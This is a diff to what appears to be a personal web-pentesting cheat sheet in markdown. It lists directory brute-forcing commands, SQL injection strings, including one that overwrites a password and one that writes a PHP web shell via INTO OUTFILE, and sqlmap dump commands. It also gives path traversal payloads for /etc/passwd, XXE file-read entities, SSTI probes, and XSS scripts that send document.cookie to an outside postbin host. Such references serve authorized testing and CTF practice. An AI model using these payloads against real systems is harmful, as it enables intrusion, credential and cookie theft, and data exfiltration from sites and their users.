@@ -9,11 +9,8 @@
 - [CMS](#cms)
 - [Certificate](#certificate)
 - [Download .git](#download-git)
-- [Dynamodb](#dynamodb)
-- [Influx DB](#influx-db)
 - [Interesting routes](#interesting-routes)
-- [MySql](#mysql)
-- [Path traversal](#path-traversal)
+- [Path traversal (LFI)](#path-traversal-lfi-)
 - [PhpMyAdmin](#phpmyadmin)
 - [Request](#request)
 - [Server Side XSS](#server-side-xss)
@@ -22,7 +19,10 @@
 - [XML external entity (XXE)](#xml-external-entity-xxe)
 - [XSS Injection](#xss-injection)
 
-# BruteForce
+# Discovery Tool
+> Some ressources are accessible by the attacker but not referenced by the web application.
+> Discovery tool bruteforce url or domain with wordlist to discover new content.
+
 ### Wordlist
 
 | Name                      | Path                                                                    |
@@ -47,6 +47,8 @@
 ```bash
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/FUZZ'
 ```
+
+***Most Popular domain discovery command***
 ```bash
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'
 ```
@@ -57,6 +59,7 @@ gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small
 ```
 
 ### Feroxbuster
+***(Best one)***
 ```bash
 feroxbuster -u <url> -e -x html,js,php
 ```
@@ -80,51 +83,43 @@ owasp-zap
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
 
-# MySql
-### Connect to mysql
-```bash
-mysql -h localhost -u myname -p
-```
-### Show Info
-```
-SHOW DATABASES;
-use db_name
-SHOW TABLES;
-select * from table_name
-```
-### Open SQLite3
-```bash
-sqlite3 database.sqlite3
-```
-or open in vs code
-
-# Influx DB
-
-[CVE-2019-20933 Influxdb](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)
-
-```
-> show databases # to display databases
-> show field keys # field keys (like columns in sql)
-> show measurements # to display measurements (like tables in sql)
-{
-  ...
-  "results": [
-    "values": [
-        [
-            <strong>"foo"</strong>
-        ]
-    ]
-  ...
-}
-> select * from "foo" # display all content of measurments (table) 'foo' (keep the doubles quotes)
-```
-
-# Dynamodb
-
-See [this page](../wiki/Cloud.md)
-
 # SQL Injection
+> SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
+> It generally allows an attacker to view data that they are not normally able to retrieve. - [Source](https://portswigger.net/web-security/sql-injection)
+
+## Manual
+### Common pattern
+```
+" OR ""="
+' OR ''='
+' OR 1=1 -- comment
+OR 1=1
+*
+```
+
+### Comment
+```
+-- comment
+# comment
+/* comment */
+/*! comment */
+```
+
+### INSERT
+```
+admin", "") ON DUPLICATE KEY UPDATE password="newpasswd";
+```
+- [INSERT DUPLICATE KEY](https://mariadb.com/kb/en/insert-on-duplicate-key-update/)
+
+
+### Separator
+```
+" UNION SELECT * FROM users
+" ; SELECT * FROM users
+```
+
 ## SQLmap
+SQLmap is a tool that automates the process of detecting and exploiting SQL injection.
 
 [SQLmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 
@@ -191,15 +186,9 @@ sqlmap -r req --sql-shell
 sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --level=2 --force-ssl --time-sec 1 --predict-output --dbms 'MySQL' --technique T  --flush-session
 ```
 
-## Manual
-### Common pattern
-```
-" OR ""="
-' OR ''='
-' OR 1=1 -- comment
-```
-
 # Request
+> Different tool to make a http request.
+
 ## Curl
 ### Send X-form
 ```bash
@@ -212,40 +201,65 @@ curl -X POST https://example.com/api/submit -H "Content-Type: application/json" 
 ```
 
 ## Python
-### Requests
 ```python
 import requests
 
-s = requests.session()
-# s.proxies = {
-#   "http": "localhost:8080",
-#   "https": "localhost:8080",
-# }
-
-r = s.get('http://example.com')
-print(r.text)
-r = s.post('http://example.com/submit',
+# GET
+requests.get('http://example.com')
+# POST
+requests.post('http://example.com/submit',
     headers={
         'Content-type': 'raw',
     },
     data={'user': 'guest'},
-    # auth=('username', 'password')
 )
-print(r.status_code, r.url)
+```
+- [Details script](/wiki/Python.md#requests)
+
+## Javascript
+```javascript
+//  GET
+fetch('http://example.com/',{
+    method: 'GET',
+})
+
+// POST
+fetch('http://example.com/',{
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({data: 'lol'})
+})
 ```
 
-# Path traversal
+# Path traversal (LFI)
+> A path traversal attack aims to access files and directories that are stored outside the web root folder by manipulating variables that reference files.
+> It may be possible to access arbitrary files and directories including application source code or configuration and critical system files.
 
-[Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
-
-[File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
-
+### Pattern
 ```
 ︰/︰/︰/︰/︰/︰/︰/︰/︰/etc/passwd
 ..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/%252f/etc/passwd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 %252e%252e%252e%252e%252e%252fetc%252fpasswd%00
 ```
+```
+../
+︰/
+..%252f/
+..%2f
+%2e%2e%2f
+%2e%2e/
+%2e%2e%5c
+..%5c
+%252e%252e%255c
+..%255c
+..%c0%af
+```
+
+- [Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)
+- [File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
 
 # Download .git
 ```bash
@@ -254,6 +268,9 @@ githacker --url http://url/.git/ --folder result
 [Source](https://github.com/WangYihang/GitHacker)
 
 # XML external entity (XXE)
+> XML external entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 
+> It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access. - [source](https://portswigger.net/web-security/xxe)
+
 ### Read File
 ```xml
 <!DOCTYPE foo [
@@ -267,6 +284,7 @@ githacker --url http://url/.git/ --folder result
 ]>
 <foo>Hello &file;</foo>
 ```
+
 ### Get Link
 ```xml
 <!DOCTYPE foo [
@@ -276,21 +294,27 @@ githacker --url http://url/.git/ --folder result
 ```
 ```xml
 <!DOCTYPE foo [
-    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/path">
 ]>
 <foo>Hello &file;</foo>
 ```
 
 # SSTI
-[Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
+> Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection.
+> Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE).
+> [source](https://portswigger.net/research/server-side-template-injection)
 
 ### Test
+```t
+${{<%[%'"}}%\.
+```
 ```
 {{1+1}}
 ${1+1}
 <%= 1+1 %>
 ${{1+1}}
 #{1+1}
+@(1+2)
 ```
 
 ### Nunchucks (Nodejs)
@@ -309,6 +333,9 @@ ${{1+1}}
 {{.}}
 ```
 
+- [PayloadsAllTheThings - STTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+- [Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
+
 # CMS
 ### Scaning
 ```bash
@@ -325,13 +352,22 @@ wpscan --force update -e --url IP --disable-tls-checks
 /graphql/console
 ```
 
+### Python
+```
+/console
+/cgi
+```
+
 # Certificate
 ```
 curl <url> --key KEY.key --cert CERT.cert
 ```
 
 # XSS Injection
-## Script injection
+> XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy.
+> [source](https://en.wikipedia.org/wiki/Cross-site_scripting)
+
+## Script
 ```html
 <script>window.open('https://www.toptal.com/developers/postbin/123-123?' + document.cookie);</script>
 ```
@@ -342,9 +378,18 @@ curl <url> --key KEY.key --cert CERT.cert
 <script>fetch('https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie), { method: 'GET',})</script>
 ```
 
+## Object
+```html
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+```
+```html
+
+```
+
 ### Useful Link
 - [Toptal/postbin - Exfiltrate information](https://www.toptal.com/developers/postbin/)
 - [CSP Evalutor](https://csp-evaluator.withgoogle.com/)
+- [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
 
 # Server Side XSS
 ## Dynamic PDF
